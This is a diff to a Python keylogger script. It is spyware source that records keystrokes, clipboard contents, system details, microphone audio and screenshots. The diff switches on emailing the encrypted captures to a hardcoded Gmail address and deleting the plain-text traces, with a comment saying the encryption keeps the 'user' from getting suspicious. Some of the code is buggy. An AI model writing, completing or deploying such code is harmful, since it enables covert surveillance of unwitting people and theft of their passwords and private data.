@@ -27,22 +27,25 @@ from requests import get
 from multiprocessing import Process,freeze_support
 from PIL import ImageGrab
 
-
+#File paths
 keys_information  = "key_log.txt"
 system_information = "system.txt"
 clipboard_info = "clipboard.txt"
 screenshot_information = "screenshot.png"
 
+#Encrypted file paths
 keys_information_e = "e_key_log.txt"
 system_information_e = "e_systeminfo.txt"
 clipboard_info_e = "e_clipboard.txt"
 
+#Email Addess , modify this to work
 from_address = "dummy@gmail.com"
 from_password = "dummypassword"
 toaddr = "dummy@gmail.com"
 
 username = getpass.getuser()
 
+#Key for encryption and decryption
 key = "T6SKgZgknBO5v2JOn2MxKz8GChIUfwCvHq6zebRy8Lk="
 
 microphone_time = 10
@@ -52,11 +55,12 @@ time_iteration = 15
 number_of_iterations_end = 3
 
 
-file_path = "C:\\Users\\abhis\Downloads\\PythonKeylogger"
+file_path = "C:\\Users\\waste\Downloads\\PythonKeylogger"
 extend = "\\"
 
 file_merge = file_path + extend
 
+#Function to send an email
 def send_email(filename, attachment, toaddr):
     
     fromaddr = from_address
@@ -109,8 +113,7 @@ def send_email(filename, attachment, toaddr):
     # terminating the session 
     s.quit() 
 
-#send_email(keys_information, file_path + extend + keys_information, toaddr)
-
+#Function to get Sytem Info
 def computer_information():
     with open(file_path + extend + system_information, "a") as f:
         hostname = socket.gethostname()
@@ -128,8 +131,7 @@ def computer_information():
         f.write("Hostname: " + hostname + "\n")
         f.write("Private IP Address: " + IPAddr + "\n")
 
-#computer_information()
-
+#Function to get clipboard info
 def clipboard_information():
     with open(file_path + extend + clipboard_info, "a") as f:
         try:
@@ -142,8 +144,7 @@ def clipboard_information():
         except Exception:
             f.write("Clipboard could not be copied")
 
-#clipboard_information()
-
+#Function to get microphone audio
 def microphone():
     fs = 44100
     seconds = microphone_time
@@ -153,18 +154,15 @@ def microphone():
 
     write(file_path + extend + audio_information, fs, myrecording)
 
-#microphone()
-
 def screenshot():
     im = ImageGrab.grab()
     im.save(file_path + extend + screenshot_information)
-
-#screenshot()
 
 number_of_iterations = 0
 currentTime = time.time()
 stoppingTime = time.time() + time_iteration
 
+#Loop to send email and capture data every 15 Seconds
 while number_of_iterations < number_of_iterations_end:
 
     count = 0
@@ -223,11 +221,13 @@ while number_of_iterations < number_of_iterations_end:
         stoppingTime = time.time + time_iteration
 
 
+#Files for encryption so user will not get suspicious
 files_to_encrypt = [file_merge + system_information, file_merge + clipboard_info, file_merge + keys_information]
 encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_info_e, file_merge + keys_information_e]
 
 count = 0 
 
+#Encrypting files
 for encrypting_file in files_to_encrypt:
     with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()
@@ -238,15 +238,16 @@ for encrypting_file in files_to_encrypt:
     with open(encrypted_file_names[count], "wb") as f:
         f.write(encrypted)
     
-    #send_email(encrypted_file_names[0], encrypted_file_names[count], toaddr)
+    send_email(encrypted_file_names[0], encrypted_file_names[count], toaddr)
 
     count += 1
 
 time.sleep(120)
 
-# delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
-# for file in delete_files:
-#     os.remove(file_merge + file)
+#Cleaning the plain text files
+delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
+for file in delete_files:
+    os.remove(file_merge + file)
 
 
 
